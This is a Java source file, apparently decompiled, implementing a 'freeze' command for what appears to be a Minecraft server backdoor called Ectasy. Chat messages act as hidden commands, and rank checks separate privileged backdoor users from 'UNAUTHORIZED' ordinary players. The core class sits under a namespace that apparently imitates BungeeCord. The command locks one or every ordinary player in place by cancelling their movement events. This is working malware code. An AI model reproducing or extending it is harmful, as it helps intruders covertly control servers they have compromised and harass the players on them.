package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "freeze",
   description = "Freeze a player",
   blatant = true,
   rank = Rank.FREE
)
public class FreezeCommand extends AbstractCommand implements Listener {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use freeze <player name> or freeze *");
            } else if (args[0].equals("*")) {
               for(User var2 : Ectasy.users.values()) {
                  if (var2.rank == Rank.UNAUTHORIZED) {
                     var2.frozen = true;
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Froze everyone.");
            } else {
               Player var1 = Bukkit.getServer().getPlayer(args[0]);
               if (var1 == null) {
                  ChatUtil.sendChat(e.getPlayer(), "The player " + args[0] + " is not online.");
               } else {
                  Ectasy.users.get(var1.getName()).frozen = true;
                  ChatUtil.sendChat(e.getPlayer(), "Froze " + var1.getName());
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
   
   @EventHandler
   public void onPlayerMoveEvent(PlayerMoveEvent var1) {
      User var2 = Ectasy.users.get(var1.getPlayer().getName());
      if (var2 != null) {
         if (var2.frozen) {
            var1.setTo(var1.getFrom());
         }
      }
   }
}
